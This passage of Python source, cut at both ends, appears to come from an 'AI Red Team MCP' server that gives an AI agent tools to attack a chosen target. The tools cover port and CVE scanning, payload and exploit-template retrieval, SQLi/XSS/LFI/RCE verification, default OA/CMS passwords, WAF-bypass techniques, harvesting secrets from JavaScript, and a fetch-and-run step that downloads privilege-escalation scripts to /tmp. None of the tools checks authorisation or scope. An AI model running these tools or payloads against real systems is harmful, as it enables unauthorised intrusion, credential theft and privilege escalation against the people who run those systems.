        return run_cmd(["wget", "-q", urls[script_name], "-O", f"/tmp/{script_name}"], 60)
    
    return {
        "success": True,
        "script": script_name,
        "download_url": urls[script_name],
        "usage": f"wget {urls[script_name]} -O {script_name}; chmod +x {script_name}; ./{script_name}"
    }

def _linux_exploit_suggester(args: Dict) -> Dict:
    kernel = args.get("kernel_version")
    if kernel:
        return {"success": True, "kernel": kernel, "note": "使用linux-exploit-suggester.sh检测漏洞", 
                "download": "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"}
    return run_cmd(["uname", "-r"], 10)

def _aws_enum(args: Dict) -> Dict:
    profile = args.get("profile")
    service = args.get("service", "all")
    
    if not profile:
        return {"success": True, "message": "需要AWS配置文件", "setup": "aws configure"}
    
    if service == "s3" or service == "all":
        return run_cmd(["aws", "s3", "ls", "--profile", profile], 60)
    return {"success": True, "message": f"AWS {service}枚举需要进一步配置"}

def _s3_scanner(args: Dict) -> Dict:
    bucket = args["bucket"]
    return run_cmd(["aws", "s3", "ls", f"s3://{bucket}", "--no-sign-request"], 60)

def _auto_recon(args: Dict) -> Dict:
    """智能自动化打点"""
    from auto_recon import AutoReconEngine
    
    target = args.get("target")
    if not target:
        return {"success": False, "error": "需要指定目标"}
    
    options = {
        "fast_mode": args.get("fast_mode", False),
        "deep_scan": args.get("deep_scan", True),
        "web_scan": args.get("web_scan", True)
    }
    
    engine = AutoReconEngine(target, options)
    return engine.run()


def _smart_service_scan(args: Dict) -> Dict:
    """智能服务扫描 - 根据端口自动选择最佳扫描策略"""
    target = args["target"]
    ports = args.get("ports", "").split(",")
    
    results = {"success": True, "target": target, "scans": []}
    
    # 服务到扫描策略的映射
    port_strategies = {
        "21": ("ftp", ["nmap -sV -sC -p 21", "检查匿名登录"]),
        "22": ("ssh", ["ssh-audit", "hydra SSH爆破"]),
        "23": ("telnet", ["nmap -sV -p 23", "telnet连接测试"]),
        "25": ("smtp", ["nmap --script smtp-* -p 25"]),
        "53": ("dns", ["dig AXFR", "dnsrecon"]),
        "80": ("http", ["whatweb", "nikto", "gobuster", "nuclei"]),
        "110": ("pop3", ["nmap -sV -p 110"]),
        "139": ("netbios", ["enum4linux", "smbclient"]),
        "143": ("imap", ["nmap -sV -p 143"]),
        "443": ("https", ["sslscan", "whatweb", "nikto", "nuclei"]),
        "445": ("smb", ["enum4linux", "crackmapexec smb", "smbmap"]),
        "1433": ("mssql", ["nmap --script ms-sql-* -p 1433"]),
        "1521": ("oracle", ["nmap --script oracle-* -p 1521"]),
        "3306": ("mysql", ["nmap --script mysql-* -p 3306", "hydra mysql"]),
        "3389": ("rdp", ["nmap --script rdp-* -p 3389"]),
        "5432": ("postgresql", ["nmap -sV -p 5432"]),
        "5900": ("vnc", ["nmap --script vnc-* -p 5900"]),
        "6379": ("redis", ["nmap --script redis-* -p 6379"]),
        "8080": ("http-proxy", ["whatweb", "nikto", "gobuster"]),
        "27017": ("mongodb", ["nmap --script mongodb-* -p 27017"])
    }
    
    for port in ports:
        port = port.strip()
        if port in port_strategies:
            service, tools = port_strategies[port]
            results["scans"].append({
                "port": port,
                "service": service,
                "recommended_tools": tools,
                "priority": "high" if service in ["http", "https", "smb", "ssh"] else "medium"
            })
        else:
            results["scans"].append({
                "port": port,
                "service": "unknown",
                "recommended_tools": [f"nmap -sV -sC -p {port}"],
                "priority": "low"
            })
    
    # 按优先级排序
    results["scans"].sort(key=lambda x: {"high": 0, "medium": 1, "low": 2}.get(x["priority"], 3))
    
    return results


def _ai_attack_plan(args: Dict) -> Dict:
    target = args["target"]
    recon_data = args.get("recon_data", {})
    
    plan = {
        "target": target,
        "phases": [
            {"phase": 1, "name": "信息收集", "tools": ["nmap_scan", "subdomain_enum", "dns_enum"], "description": "收集目标基础信息"},
            {"phase": 2, "name": "漏洞扫描", "tools": ["vuln_scan", "dir_scan", "sslscan"], "description": "发现潜在漏洞"},
            {"phase": 3, "name": "漏洞利用", "tools": ["sqli_test", "xss_scan", "brute_force"], "description": "尝试利用漏洞"},
            {"phase": 4, "name": "后渗透", "tools": ["linpeas", "linux_exploit_suggester"], "description": "权限提升和持久化"}
        ],
        "recommendations": ["首先进行被动信息收集", "识别攻击面后进行漏洞扫描", "针对发现的漏洞选择合适的利用方式"]
    }
    
    return {"success": True, "plan": plan}


# ========== 增强功能实现 ==========

def _enhanced_full_scan(args: Dict) -> Dict:
    """增强型全量扫描"""
    from modules.enhanced_scanner import EnhancedScanner
    
    target = args.get("target")
    if not target:
        return {"success": False, "error": "需要指定目标域名"}
    
    scanner = EnhancedScanner()
    scanner.run_full_scan(target)
    return {"success": True, "results": scanner.results}


def _get_payloads(args: Dict) -> Dict:
    """获取超级Payload库"""
    from modules.mega_payloads import MegaPayloads
    
    vuln_type = args.get("vuln_type", "sqli")
    category = args.get("category", "all")
    dbms = args.get("dbms", "mysql")
    
    payloads = MegaPayloads.get(vuln_type, category, dbms)
    stats = MegaPayloads.count()
    
    return {
        "success": True,
        "vuln_type": vuln_type,
        "category": category,
        "payloads": payloads,
        "count": len(payloads),
        "total_stats": stats
    }


def _identify_components(args: Dict) -> Dict:
    """组件识别"""
    from modules.component_fingerprint import ComponentIdentifier
    
    target = args.get("target")
    headers = args.get("headers", {})
    body = args.get("body", "")
    
    ci = ComponentIdentifier()
    results = []
    
    if headers:
        results.extend(ci.identify_from_headers(headers))
    if body:
        results.extend(ci.identify_from_body(body))
    if target:
        results.extend(ci.identify_from_url(target))
    
    # 获取推荐payload
    comp_names = list(set([r["component"] for r in results]))
    recommended = ci.get_recommended_payloads(comp_names)
    
    return {
        "success": True,
        "components": results,
        "recommended_payloads": recommended
    }


def _verify_vuln(args: Dict) -> Dict:
    """漏洞验证"""
    from modules.vuln_verifier import VulnerabilityVerifier
    
    url = args.get("url")
    param = args.get("param")
    vuln_type = args.get("vuln_type", "sqli")
    payload = args.get("payload", "")
    
    if not url or not param:
        return {"success": False, "error": "需要url和param参数"}
    
    verifier = VulnerabilityVerifier()
    
    if vuln_type == "sqli":
        result = verifier.verify_sqli_error(url, param)
        if not result.is_vulnerable:
            result = verifier.verify_sqli_boolean(url, param)
        if not result.is_vulnerable:
            result = verifier.verify_sqli_time_based(url, param)
    elif vuln_type == "xss":
        result = verifier.verify_xss_reflected(url, param, payload or "<script>alert(1)</script>")
    elif vuln_type == "lfi":
        result = verifier.verify_lfi(url, param, payload or "../../../etc/passwd")
    elif vuln_type == "rce":
        result = verifier.verify_rce_time_based(url, param)
    elif vuln_type == "ssrf":
        result = verifier.verify_ssrf(url, param)
    else:
        return {"success": False, "error": f"不支持的漏洞类型: {vuln_type}"}
    
    return {
        "success": True,
        "verified": result.is_vulnerable,
        "confidence": result.confidence,
        "vuln_type": result.vuln_type,
        "evidence": result.evidence,
        "recommendation": result.recommendation,
        "response_time": result.response_time,
        "url": result.url
    }


def _payload_stats(args: Dict) -> Dict:
    """Payload统计"""
    from modules.mega_payloads import MegaPayloads
    
    stats = MegaPayloads.count()
    
    return {
        "success": True,
        "statistics": stats,
        "categories": {
            "sqli": ["auth_bypass", "union_select", "error_based", "time_based", "stacked", "waf_bypass", "out_of_band"],
            "xss": ["basic", "event_handlers", "encoded", "waf_bypass", "dom_based", "polyglot", "csp_bypass"],
            "lfi": ["linux", "windows", "encoded", "php_wrapper", "null_byte", "double_encoding"],
            "rce": ["command_injection", "php", "template_injection", "log4j", "spring4shell"],
            "ssrf": ["basic", "cloud_metadata", "bypass", "protocol"],
            "xxe": ["basic", "ssrf", "blind", "oob", "dos"]
        }
    }


def _nuclei_scan(args: Dict) -> Dict:
    """Nuclei全量扫描"""
    from modules.nuclei_integration import NucleiScanner
    
    target = args.get("target")
    preset = args.get("preset", "quick")
    severity = args.get("severity")
    tags = args.get("tags")
    
    if not target:
        return {"success": False, "error": "需要指定目标"}
    
    scanner = NucleiScanner()
    result = scanner.scan(target, preset=preset, severity=severity, tags=tags)
    
    if result.get("success"):
        report = scanner.generate_report(result.get("vulnerabilities", []))
        result["report"] = report
    
    return result


def _nuclei_cve_scan(args: Dict) -> Dict:
    """Nuclei CVE扫描"""
    from modules.nuclei_integration import NucleiScanner
    
    target = args.get("target")
    cve_ids = args.get("cve_ids", [])
    
    if not target:
        return {"success": False, "error": "需要指定目标"}
    
    scanner = NucleiScanner()
    return scanner.scan_cves(target, cve_ids if cve_ids else None)


def _get_exploit(args: Dict) -> Dict:
    """获取漏洞利用模板"""
    from modules.exploit_templates import ExploitTemplates
    
    exploit_type = args.get("type", "cve")
    name = args.get("name", "")
    
    if exploit_type == "cve":
        exploit = ExploitTemplates.get_cve_exploit(name)
        all_cves = ExploitTemplates.list_cves()
        return {"success": True, "exploit": exploit, "available_cves": all_cves}
    elif exploit_type == "framework":
        exploit = ExploitTemplates.get_framework_exploit(name)
        all_frameworks = ExploitTemplates.list_frameworks()
        return {"success": True, "exploit": exploit, "available_frameworks": all_frameworks}
    elif exploit_type == "middleware":
        exploit = ExploitTemplates.get_middleware_exploit(name)
        return {"success": True, "exploit": exploit}
    else:
        return {"success": False, "error": f"未知类型: {exploit_type}"}


def _list_exploits(args: Dict) -> Dict:
    """列出所有漏洞利用模板"""
    from modules.exploit_templates import ExploitTemplates
    
    return {
        "success": True,
        "cves": ExploitTemplates.list_cves(),
        "frameworks": ExploitTemplates.list_frameworks(),
        "statistics": ExploitTemplates.count()
    }


def register_enhanced_tools(server):
    """注册增强工具"""
    
    # 44. 增强型全量扫描
    server.register_tool("enhanced_scan", "🚀 增强型全量扫描 - 资产探测+组件识别+智能漏洞扫描", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标域名"}
        },
        "required": ["target"]
    }, lambda a: _enhanced_full_scan(a))
    
    # 45. Payload获取
    server.register_tool("get_payloads", "💉 获取Payload - 获取指定类型的漏洞利用Payload", {
        "type": "object",
        "properties": {
            "vuln_type": {"type": "string", "enum": ["sqli", "xss", "lfi", "rce", "ssrf", "xxe"], "description": "漏洞类型"},
            "category": {"type": "string", "description": "Payload分类(detection/union/basic等)", "default": "all"},
            "dbms": {"type": "string", "enum": ["mysql", "mssql", "postgresql", "oracle"], "default": "mysql"}
        },
        "required": ["vuln_type"]
    }, lambda a: _get_payloads(a))
    
    # 46. 组件识别
    server.register_tool("identify_tech", "🔬 组件识别 - 识别Web技术栈并推荐Payload", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL"},
            "headers": {"type": "object", "description": "HTTP响应头"},
            "body": {"type": "string", "description": "响应体内容"}
        }
    }, lambda a: _identify_components(a))
    
    # 47. 漏洞验证
    server.register_tool("verify_vuln", "✅ 漏洞验证 - 自动验证漏洞真实性", {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "目标URL"},
            "param": {"type": "string", "description": "测试参数名"},
            "vuln_type": {"type": "string", "enum": ["sqli", "xss", "lfi", "rce", "ssrf"], "description": "漏洞类型"},
            "payload": {"type": "string", "description": "自定义Payload(可选)"}
        },
        "required": ["url", "param", "vuln_type"]
    }, lambda a: _verify_vuln(a))
    
    # 48. Payload统计
    server.register_tool("payload_stats", "📊 Payload统计 - 查看Payload库统计信息", {
        "type": "object",
        "properties": {}
    }, lambda a: _payload_stats(a))
    
    # 49. Nuclei全量扫描
    server.register_tool("nuclei_full", "🔥 Nuclei全量扫描 - 使用全部Nuclei模板扫描", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL"},
            "preset": {"type": "string", "enum": ["quick", "full", "cve_only", "web", "exposure", "network", "takeover"], "default": "quick"},
            "severity": {"type": "string", "description": "严重性过滤 (info,low,medium,high,critical)"},
            "tags": {"type": "string", "description": "标签过滤"}
        },
        "required": ["target"]
    }, lambda a: _nuclei_scan(a))
    
    # 50. Nuclei CVE扫描
    server.register_tool("nuclei_cve", "🎯 Nuclei CVE扫描 - 专项CVE漏洞扫描", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL"},
            "cve_ids": {"type": "array", "items": {"type": "string"}, "description": "CVE ID列表"}
        },
        "required": ["target"]
    }, lambda a: _nuclei_cve_scan(a))
    
    # 51. 获取漏洞利用模板
    server.register_tool("get_exploit", "💣 获取漏洞利用 - 获取CVE/框架/中间件漏洞利用Payload", {
        "type": "object",
        "properties": {
            "type": {"type": "string", "enum": ["cve", "framework", "middleware"], "description": "漏洞类型"},
            "name": {"type": "string", "description": "漏洞名称(如CVE-2021-44228, spring, tomcat)"}
        },
        "required": ["type", "name"]
    }, lambda a: _get_exploit(a))
    
    # 52. 列出所有漏洞利用
    server.register_tool("list_exploits", "📋 列出漏洞利用 - 列出所有可用的漏洞利用模板", {
        "type": "object",
        "properties": {}
    }, lambda a: _list_exploits(a))
    
    # 53. 系统检查
    server.register_tool("system_check", "🔧 系统检查 - 检查所有工具可用性", {
        "type": "object",
        "properties": {}
    }, lambda a: _system_check(a))
    
    # 54. 快速侦察
    server.register_tool("quick_recon", "⚡ 快速侦察 - 一键执行基础信息收集", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标域名或URL"},
            "include_ports": {"type": "boolean", "description": "包含端口扫描", "default": True},
            "include_subdomains": {"type": "boolean", "description": "包含子域名枚举", "default": True}
        },
        "required": ["target"]
    }, lambda a: _quick_recon(a))
    
    # 55. 生成报告
    server.register_tool("generate_report", "📄 生成报告 - 生成侦察结果报告", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标"},
            "results": {"type": "object", "description": "扫描结果"},
            "format": {"type": "string", "enum": ["json", "html", "markdown"], "default": "json"}
        },
        "required": ["target", "results"]
    }, lambda a: _generate_quick_report(a))
    
    # 56. 智能打点
    server.register_tool("intelligent_recon", "🔥 智能打点 - AI驱动的深度自动化侦察", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL或域名"},
            "deep_scan": {"type": "boolean", "description": "深度扫描模式", "default": True},
            "include_js_analysis": {"type": "boolean", "description": "包含JS分析", "default": True}
        },
        "required": ["target"]
    }, lambda a: _intelligent_recon(a))
    
    # 57. 深度漏洞扫描
    server.register_tool("deep_vuln_scan", "🎯 深度漏洞扫描 - Shiro/Log4j/SQL注入等实战漏洞检测", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL"},
            "dnslog": {"type": "string", "description": "DNSLog域名(用于Log4j检测)"}
        },
        "required": ["target"]
    }, lambda a: _deep_vuln_scan(a))
    
    # 58. JS源码深度分析
    server.register_tool("js_source_analysis", "📜 JS源码深度分析 - API端点/敏感信息/Webpack还原", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL"}
        },
        "required": ["target"]
    }, lambda a: _js_source_analysis(a))
    
    # 59. 默认口令测试
    server.register_tool("default_credential_test", "🔑 默认口令测试 - OA/CMS系统默认口令检测", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL"},
            "cms_type": {"type": "string", "enum": ["seeyon", "weaver", "ruoyi", "common"], "default": "common", "description": "CMS类型"}
        },
        "required": ["target"]
    }, lambda a: _default_credential_test(a))
    
    # 60. WAF绕过测试
    server.register_tool("waf_bypass_test", "🛡️ WAF绕过测试 - 检测WAF并提供绕过建议", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL"}
        },
        "required": ["target"]
    }, lambda a: _waf_bypass_test(a))
    
    # 61. Nuclei全量扫描
    server.register_tool("nuclei_complete_scan", "☢️ Nuclei全量扫描 - 11997个模板完整扫描", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL或域名"},
            "preset": {"type": "string", "enum": ["quick", "full", "kev", "critical", "web", "exposure", "cve_2024"], "default": "quick", "description": "扫描预设"},
            "severity": {"type": "string", "description": "严重性过滤"},
            "tags": {"type": "string", "description": "标签过滤"}
        },
        "required": ["target"]
    }, lambda a: _nuclei_complete_scan(a))
    
    # 62. 完整侦察流程
    server.register_tool("complete_recon_workflow", "🔄 完整侦察流程 - 10阶段全流程自动化侦察", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标域名或企业名"},
            "phases": {"type": "array", "items": {"type": "string"}, "description": "执行阶段列表"}
        },
        "required": ["target"]
    }, lambda a: _complete_recon_workflow(a))
    
    # 63. 侦察工具链推荐
    server.register_tool("recon_tools_recommend", "🛠️ 侦察工具链推荐 - 根据场景推荐最佳工具组合", {
        "type": "object",
        "properties": {
            "scenario": {"type": "string", "enum": ["subdomain", "port_scan", "fingerprint", "directory", "vuln_scan", "full"], "description": "场景类型"}
        },
        "required": ["scenario"]
    }, lambda a: _recon_tools_recommend(a))
    
    # 64. Payload库查询
    server.register_tool("query_payload_library", "📚 Payload库查询 - 查询完整Payload库", {
        "type": "object",
        "properties": {
            "payload_type": {"type": "string", "enum": ["shiro", "log4j", "sqli", "xss", "rce", "upload", "xxe", "ssrf", "lfi", "all"], "description": "Payload类型"},
            "category": {"type": "string", "description": "具体分类"}
        },
        "required": ["payload_type"]
    }, lambda a: _query_payload_library(a))


# ========== 新增实用工具函数 ==========

def _system_check(args: Dict) -> Dict:
    """系统检查 - 检查所有工具可用性和运行状态"""
    tools_status = ToolChecker.check_all()
    available = sum(1 for v in tools_status.values() if v)
    total = len(tools_status)
    
    # 打印到终端
    if VERBOSE_MODE:
        ToolChecker.print_status()
    
    # 获取运行中的扫描任务
    running_scans = []
    if HAS_MONITOR:
        try:
            running_scans = list_running_scans()
            if running_scans:
                terminal.header("运行中的扫描任务")
                for scan in running_scans:
                    terminal.info(f"[{scan['tool_name']}] {scan['target']} - {scan['progress']}% ({scan['elapsed_seconds']:.0f}s/{scan['timeout']}s)")
        except:
            pass
    
    # 检查终端输出模块状态
    terminal_status = {
        "terminal_output": HAS_TERMINAL,
        "scan_monitor": HAS_MONITOR,
        "realtime_output": REALTIME_OUTPUT,
        "verbose_mode": VERBOSE_MODE
    }
    
    return {
        "success": True,
        "tools": tools_status,
        "summary": {
            "available": available,
            "total": total,
            "percentage": round(available / total * 100, 1)
        },
        "missing": [t for t, v in tools_status.items() if not v],
        "running_scans": running_scans,
        "terminal_status": terminal_status
    }


def _quick_recon(args: Dict) -> Dict:
    """快速侦察 - 一键执行基础信息收集"""
    target = args.get("target", "")
    include_ports = args.get("include_ports", True)
    include_subdomains = args.get("include_subdomains", True)
    
    if not target:
        return {"success": False, "error": "需要指定目标"}
    
    # 提取域名
    domain = target.replace("https://", "").replace("http://", "").rstrip("/")
    if "/" in domain:
        domain = domain.split("/")[0]
    
    results = {
        "target": target,
        "domain": domain,
        "start_time": datetime.now().isoformat(),
        "scans": {}
    }
    
    print(f"\n{'='*60}")
    print(f"  🔥 快速侦察: {domain}")
    print(f"{'='*60}\n")
    
    # 1. DNS枚举
    print("[1/5] DNS枚举...")
    results["scans"]["dns"] = _dns_enum({"domain": domain})
    
    # 2. Whois
    print("[2/5] Whois查询...")
    results["scans"]["whois"] = run_cmd(["whois", domain], 30)
    
    # 3. HTTP探测
    print("[3/5] HTTP探测...")
    url = target if target.startswith("http") else f"https://{domain}"
    results["scans"]["http_headers"] = run_cmd(["curl", "-sI", "-L", "--max-time", "10", url], 15)
    
    # 4. 子域名枚举
    if include_subdomains:
        print("[4/5] 子域名枚举...")
        results["scans"]["subdomains"] = _subdomain_enum({"domain": domain})
    
    # 5. 端口扫描
    if include_ports:
        print("[5/5] 端口扫描...")
        results["scans"]["ports"] = _nmap_scan({
            "target": domain,
            "scan_type": "quick",
            "ports": "21,22,25,53,80,110,143,443,445,3306,3389,8080,8443"
        })
    
    results["end_time"] = datetime.now().isoformat()
    results["success"] = True
    
    # 统计
    success_count = sum(1 for s in results["scans"].values() if s.get("success", False))
    results["summary"] = {
        "total_scans": len(results["scans"]),
        "successful": success_count,
        "failed": len(results["scans"]) - success_count
    }
    
    print(f"\n{'='*60}")
    print(f"  ✓ 侦察完成: {success_count}/{len(results['scans'])} 成功")
    print(f"{'='*60}\n")
    
    return results


def _generate_quick_report(args: Dict) -> Dict:
    """生成快速报告"""
    target = args.get("target", "unknown")
    results = args.get("results", {})
    format_type = args.get("format", "json")
    
    # 创建报告目录
    reports_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "reports")
    os.makedirs(reports_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    if format_type == "json":
        filename = f"recon_{target.replace('.', '_')}_{timestamp}.json"
        filepath = os.path.join(reports_dir, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
    
    elif format_type == "markdown":
        filename = f"recon_{target.replace('.', '_')}_{timestamp}.md"
        filepath = os.path.join(reports_dir, filename)
        md_content = _generate_markdown_report(target, results)
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(md_content)
    
    elif format_type == "html":
        filename = f"recon_{target.replace('.', '_')}_{timestamp}.html"
        filepath = os.path.join(reports_dir, filename)
        html_content = _generate_html_report(target, results)
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)
    
    return {
        "success": True,
        "report_path": filepath,
        "format": format_type
    }


def _generate_markdown_report(target: str, results: Dict) -> str:
    """生成Markdown报告"""
    md = f"""# 侦察报告: {target}

## 基本信息
- **目标**: {target}
- **扫描时间**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## 扫描结果

"""
    for scan_name, scan_result in results.get("scans", {}).items():
        status = "✓" if scan_result.get("success") else "✗"
        md += f"### {status} {scan_name}\n\n"
        if scan_result.get("stdout"):
            md += f"```\n{scan_result['stdout'][:2000]}\n```\n\n"
    
    md += """
---
*AI Red Team MCP - 自动化侦察报告*
"""
    return md


def _generate_html_report(target: str, results: Dict) -> str:
    """生成HTML报告"""
    scans_html = ""
    for scan_name, scan_result in results.get("scans", {}).items():
        status_class = "success" if scan_result.get("success") else "failed"
        status_icon = "✓" if scan_result.get("success") else "✗"
        output = scan_result.get("stdout", "")[:2000] if scan_result.get("stdout") else "无输出"
        scans_html += f"""
        <div class="scan-result {status_class}">
            <h3>{status_icon} {scan_name}</h3>
            <pre>{output}</pre>
        </div>
        """
    
    return f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>侦察报告 - {target}</title>
    <style>
        body {{ font-family: -apple-system, sans-serif; background: #0a0a0a; color: #e0e0e0; padding: 20px; }}
        h1 {{ color: #00ff88; }}
        h2 {{ color: #00d4ff; border-bottom: 2px solid #333; padding-bottom: 10px; }}
        h3 {{ color: #ffa502; }}
        .scan-result {{ background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #333; }}
        .scan-result.success {{ border-left-color: #2ed573; }}
        .scan-result.failed {{ border-left-color: #ff4757; }}
        pre {{ background: #2a2a2a; padding: 10px; overflow-x: auto; font-size: 12px; }}
    </style>
</head>
<body>
    <h1>🔒 侦察报告</h1>
    <p>目标: <code>{target}</code></p>
    <p>时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    
    <h2>扫描结果</h2>
    {scans_html}
    
    <footer style="margin-top: 40px; text-align: center; color: #666;">
        AI Red Team MCP - 自动化侦察报告
    </footer>
</body>
</html>"""


# ========== 智能打点工具 ==========

def _intelligent_recon(args: Dict) -> Dict:
    """🔥 智能打点 - AI驱动的深度自动化侦察"""
    try:
        # 优先使用全量版本（无外部依赖）
        from core.full_recon_engine import FullReconEngine
        
        target = args.get("target")
        if not target:
            return {"success": False, "error": "需要指定目标"}
        
        engine = FullReconEngine(target)
        results = engine.run_full_scan()
        
        return {
            "success": True,
            "results": results,
            "vulnerabilities_count": len(results.get("vulnerabilities", [])),
            "high_risk_count": results.get("summary", {}).get("high_risk", 0),
            "assets": results.get("assets", {}),
            "summary": results.get("summary", {})
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _deep_vuln_scan(args: Dict) -> Dict:
    """🎯 深度漏洞扫描 - 基于实战的漏洞检测"""
    try:
        # 优先使用全量版本（无外部依赖）
        from core.full_vuln_scanner import FullVulnScanner
        
        target = args.get("target")
        dnslog = args.get("dnslog", "")
        
        if not target:
            return {"success": False, "error": "需要指定目标"}
        
        scanner = FullVulnScanner(target, dnslog)
        results = scanner.scan_all()
        
        return {
            "success": True,
            "vulnerabilities": results.get("vulnerabilities", []),
            "summary": results.get("summary", {}),
            "vuln_count": results["summary"]["total"],
            "critical_count": results["summary"]["critical"],
            "high_count": results["summary"]["high"],
            "medium_count": results["summary"]["medium"],
            "low_count": results["summary"]["low"]
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _js_source_analysis(args: Dict) -> Dict:
    """📜 JS源码深度分析 - 提取API、敏感信息、Webpack还原"""
    import requests
    import re
    
    target = args.get("target")
    if not target:
        return {"success": False, "error": "需要指定目标URL"}
    
    try:
        resp = requests.get(target, timeout=10, verify=False)
        
        # 提取JS文件
        js_files = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', resp.text)
        js_files += re.findall(r'src:\s*["\']([^"\']+\.js[^"\']*)["\']', resp.text)
        js_files = list(set(js_files))
        
        results = {
            "js_files": js_files,
            "api_endpoints": [],
            "sensitive_info": [],
            "sourcemap_found": False
        }
        
        # 分析JS文件
        for js_file in js_files[:10]:
            try:
                if not js_file.startswith('http'):
                    js_url = f"{target.rstrip('/')}/{js_file.lstrip('/')}"
                else:
                    js_url = js_file
                
                js_resp = requests.get(js_url, timeout=5, verify=False)
                if js_resp.status_code == 200:
                    content = js_resp.text
                    
                    # 提取API端点
                    api_patterns = [
                        r'["\']/(api|admin|user|login|auth)/[^"\']+["\']',
                        r'axios\.(get|post|put|delete)\(["\']([^"\']+)["\']',
                        r'fetch\(["\']([^"\']+)["\']'
                    ]
                    for pattern in api_patterns:
                        endpoints = re.findall(pattern, content)
                        results["api_endpoints"].extend([e if isinstance(e, str) else e[1] for e in endpoints])
                    
                    # 检测敏感信息
                    sensitive_patterns = [
                        r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        r'access[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        r'secret[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']'
                    ]
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        results["sensitive_info"].extend(matches)
                    
                    # 检测sourcemap
                    if '.map' in content or 'sourceMappingURL' in content:
                        results["sourcemap_found"] = True
                        results["sourcemap_url"] = js_url + ".map"
            except:
                continue
        
        results["api_endpoints"] = list(set(results["api_endpoints"]))[:50]
        results["sensitive_info"] = list(set(results["sensitive_info"]))[:20]
        results["success"] = True
        
        return results
    except Exception as e:
        return {"success": False, "error": str(e)}


def _default_credential_test(args: Dict) -> Dict:
    """🔑 默认口令测试 - OA/CMS系统默认口令检测"""
    target = args.get("target")
    cms_type = args.get("cms_type", "common")
    
    if not target:
        return {"success": False, "error": "需要指定目标"}
    
    # 默认口令字典
    credentials = {
        "seeyon": [("system", "system"), ("admin1", "admin123456"), ("audit-admin", "seeyon123456")],
        "weaver": [("sysadmin", "1"), ("sysadmin", "Weaver@2001")],
        "ruoyi": [("admin", "admin123"), ("admin", "admin123456")],
        "common": [("admin", "admin"), ("admin", "123456"), ("root", "root")]
    }
    
    test_creds = credentials.get(cms_type, credentials["common"])
    
    return {
        "success": True,
        "cms_type": cms_type,
        "credentials_to_test": test_creds,
        "note": "建议手动测试这些默认口令，避免账号锁定"
    }


def _waf_bypass_test(args: Dict) -> Dict:
    """🛡️ WAF绕过测试 - 检测WAF并提供绕过建议"""
    import requests
    
    target = args.get("target")
    if not target:
        return {"success": False, "error": "需要指定目标"}
    
    try:
        # 检测WAF
        resp = requests.get(target, timeout=10, verify=False)
        headers = resp.headers
        
        waf_detected = None
        waf_indicators = {
            "Cloudflare": ["cloudflare", "cf-ray"],
            "Akamai": ["akamai"],
            "AWS WAF": ["x-amzn"],
            "F5 BIG-IP": ["bigip", "f5"],
            "ModSecurity": ["mod_security"],
            "Imperva": ["incapsula", "imperva"]
        }
        
        for waf_name, indicators in waf_indicators.items():
            for indicator in indicators:
                if any(indicator in str(v).lower() for v in headers.values()):
                    waf_detected = waf_name
                    break
            if waf_detected:
                break
        
        bypass_techniques = [
            "使用OPTIONS请求方法",
            "访问静态资源路径",
            "缩短Payload长度",
            "使用编码绕过(URL编码、Unicode编码)",
            "修改User-Agent",
            "使用IP轮换",
            "分块传输(Chunked Transfer)",
            "大小写混淆",
            "注释符绕过"
        ]
        
        return {
            "success": True,
            "waf_detected": waf_detected or "未检测到WAF",
            "bypass_techniques": bypass_techniques,
            "recommendation": "根据WAF类型选择合适的绕过技巧"
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _nuclei_complete_scan(args: Dict) -> Dict:
    """☢️ Nuclei全量扫描 - 11997个模板"""
    from core.complete_recon_toolkit import CompleteReconToolkit
    
    target = args.get("target")
    preset = args.get("preset", "quick")
    
    if not target:
        return {"success": False, "error": "需要指定目标"}
    
    # 生成Nuclei命令
    cmd_str = CompleteReconToolkit.get_nuclei_command(target, preset)
    cmd = cmd_str.split()
    
    # 执行扫描
    result = run_cmd_with_progress(cmd, "nuclei", target, 600)
    
    if result.get("success"):
        # 解析结果
        vulns = []
        for line in result.get("stdout", "").split('\n'):
            if line.strip() and '[' in line:
                vulns.append(line.strip())
        
        result["vulnerabilities"] = vulns
        result["vuln_count"] = len(vulns)
        result["preset"] = preset
        result["template_info"] = {
            "total_templates": 11997,
            "kev_templates": 1496,
            "preset_used": preset
        }
    
    return result


def _complete_recon_workflow(args: Dict) -> Dict:
    """🔄 完整侦察流程 - 10阶段全流程"""
    from core.complete_recon_toolkit import CompleteReconToolkit
    
    target = args.get("target")
    if not target:
        return {"success": False, "error": "需要指定目标"}
    
